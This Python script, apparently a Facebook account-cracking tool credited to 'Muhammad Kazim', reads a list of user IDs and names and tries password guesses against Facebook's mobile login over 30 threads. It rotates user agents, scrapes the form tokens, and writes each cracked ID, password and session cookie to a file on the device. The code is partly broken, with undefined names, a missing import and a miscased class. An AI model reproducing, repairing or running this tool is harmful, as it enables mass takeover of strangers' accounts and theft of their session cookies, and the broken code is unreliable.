import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

logo = f"""{w}\
{w}  db   dD  .d8b.  d88888D d888888b .88b  d88. 
{w}  88 ,8P' d8' `8b YP  d8'   `88'   88'YbdP`88 
{g}  88,8P   88ooo88    d8'     88    88  88  88 
{g}  88`8b   88~~~88   d8'      88    88  88  88 {w}
{w}  88 `88. 88   88  d8' db   .88.   88  88  88 
{w}  YP   YD YP   YP d88888P Y888888P YP  YP  YP 
{w}-----------------------------------------------
 [â€¢] Author  : Muhammad Kazim
 [â€¢] Github  : Not Found
 [â€¢] Version : Personal
{w}-----------------------------------------------\
"""

loop = 0
idz = []
oks = []
cps = []
pwx = []

agents = ["Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Symbian3; U; en-us; Nokia500) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.7.1.234/51/355/UCWEB Mobile",
"Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.25 (KHTML, like Gecko) Version/11.0 Mobile/15A5304i Safari/604.1",
"Mozilla/5.0 (Linux; Android 13; SM-M236B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",
"Mozilla/5.0 (Linux; Android 11; 21061119AG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;]"]

def clear():
    os.system("clear")
    print(logo)

def linex():
    print(f"{w}-----------------------------------------------")

def results():
    linex()
    print(" [â€¢] Process Completed ")
    print(" [â€¢] Total Ok Accounts : "+str(len(oks)))
    print(" [â€¢] Total Cp Accounts : "+str(len(cps)))
    linex()
    input(" [!] Press enter to back ")
    exit()

def menu():
    clear()
    print(" [1] File Clone ")
    print(" [2] Exit ")
    linex()
    x = input(" [?] Select : ")
    if x == "1":
        file()
    elif x == "2":
        exit(" [!] Select valid option ")
    else:
        menu()

def file():
    clear()
    print(" [â€¢] Example > /sdcard ")
    linex()
    f_path = input(" [?] Enter File : ")
    try:
        for x in open(f_path, "r").readlines():
            idz.append(x.strip())
    except FileNotFoundError:
        exit(" [!] File not found ")
    method()

def passw():
    clear()
    print(" [â€¢] Maximum Limit > 10 ")
    linex()
    try:
        p_limit = int(input(" [?] Enter Password Limit : "))
    except ValueError:
        p_limitb= 5
    clear()
    for x in range(p_limit):
        plist = input(f" [{x+1}] Enter Password : ")
        pwx.append(plist)
    process()

def process():
    clear()
    print(" [â€¢] Total Accounts  : "+str(len(idz)))
    print(" [!] Use Flight Mode For Speed Up ")
    linex()
    with Threadpoolexecutor(max_workers=30) as xd:
        for x in idz:
            uid, name = x.split("|")
            pword = pwx
            xd.submit(free, uid, name, pword, total_idz)
    results()

def free(uid, name, pword, total_idz):
    global loop
    global oks
    global cps
    sys.stdout.write("\r %s[Running] [%s] [Ok-%s] [Cp-%s]\r"%(w,loop,len(oks),len(cps)))
    sys.stdout.flush()
    try:
        for ps in pww:
            pw = ps.replace("first", first).replace("last", last).replace("name", name).lower()
            ua = random.choice(agents)
            session = requests.Session()
            free = session.get("https://x.facebook.com").text
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pw,
                "login": "Log In",
            }
            headers = {
                'authority': 'x.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'referer': 'https://x.facebook.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
            }
            po = session.post("https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8", data=data, headers=headers).text
            ses_coki = session.cookies.get_dict().keys()
            if "c_user" in ses_coki:
                coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(" %s[KAZIM-OK] %s | %s"%(g,uid,pw))
                open("/sdcard/Kazim-Ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid)
                break
            elif "checkpoint" in ses_coki:
                print(" %s[KAZIM-CP] %s | %s"%(r,uid,pw))
                open("/sdcard/Kazim-Cp.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1
    except Exception as error:
        print(error)
        sys.exit()

menu()
